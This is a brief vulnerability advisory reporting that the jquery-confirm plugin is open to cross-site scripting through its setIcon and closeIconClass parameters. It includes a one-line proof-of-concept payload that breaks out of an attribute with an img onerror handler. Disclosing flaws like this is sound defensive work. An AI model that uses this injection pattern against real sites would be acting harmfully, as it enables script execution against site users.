# Overview

`jquery-confirm` is a multipurpose plugin for jquery alert, confirm & dialog.

This package is vulnerable to Cross-site Scripting (XSS), HTML can be injected via. `setIcon` and `closeIconClass`.

# Proof of Concept

```
// This shows succesful script execution: alert(0) is executed:
$.confirm().setIcon('"><img src onerror="alert(0)"><"')
```
